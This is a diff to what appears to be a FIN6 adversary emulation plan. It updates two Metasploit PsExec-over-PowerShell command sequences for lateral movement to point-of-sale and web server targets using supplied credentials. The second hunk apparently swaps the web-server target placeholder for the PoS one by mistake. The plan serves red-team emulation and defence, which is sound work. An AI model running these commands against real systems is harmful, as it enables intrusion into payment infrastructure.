@@ -32,18 +32,19 @@ Additional service names (T1036.004) used by FIN6 in persisting PoS malware:<sup
 
 #### 5.1 Lateral movement to PoS system using a Command and Control (C2) Framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> <sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>
 
-Metasploit PowerShell PsExec (T1059.001, T1569.002)
+Metasploit PsExec - PowerShell (T1059.001, T1569.002)
 
 ##### FIN6 Procedure
 
 ```sh
-msf> use exploit/windows/smb/psexec_psh
-msf exploit(psexec_psh) > set SMBDomain #{Domain}
-msf exploit(psexec_psh) > set rhost #{PoS system}
-msf exploit(psexec_psh) > set rport #{Port}
-msf exploit(psexec_psh) > set SMBPass #{Password}
-msf exploit(psexec_psh) > set SMBUser #{User}
-msf exploit(psexec_psh) > exploit -j
+msf> use exploit/windows/smb/psexec
+msf exploit(psexec) > set TARGET PowerShell
+msf exploit(psexec) > set SMBDomain #{Domain}
+msf exploit(psexec) > set rhost #{PoS system}
+msf exploit(psexec) > set rport #{Port}
+msf exploit(psexec) > set SMBPass #{Password}
+msf exploit(psexec) > set SMBUser #{User}
+msf exploit(psexec) > exploit -j
 ```
 
 CobaltStrike PowerShell PsExec (T1059.001, T1569.002)
@@ -156,18 +157,19 @@ For organizations that are not in favor of injecting scripts into operational pa
 
 #### 6.1 Lateral Movement Using C2 Frameworks<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>
 
-Metasploit PowerShell PsExec (T1059.001, T1569.002)
+Metasploit PsExec - PowerShell (T1059.001, T1569.002)
 
 ##### FIN6 Procedure
 
 ```sh
-msf> use exploit/windows/smb/psexec_psh
-msf exploit(psexec_psh) > set SMBDomain #{Domain}
-msf exploit(psexec_psh) > set rhost #{Web Server}
-msf exploit(psexec_psh) > set rport #{Port}
-msf exploit(psexec_psh) > set SMBPass #{Password}
-msf exploit(psexec_psh) > set SMBUser #{User}
-msf exploit(psexec_psh) > exploit -j
+msf> use exploit/windows/smb/psexec
+msf exploit(psexec) > set TARGET PowerShell
+msf exploit(psexec) > set SMBDomain #{Domain}
+msf exploit(psexec) > set rhost #{PoS system}
+msf exploit(psexec) > set rport #{Port}
+msf exploit(psexec) > set SMBPass #{Password}
+msf exploit(psexec) > set SMBUser #{User}
+msf exploit(psexec) > exploit -j
 ```
 
 CobaltStrike PowerShell PsExec (T1059.001, T1569.002)
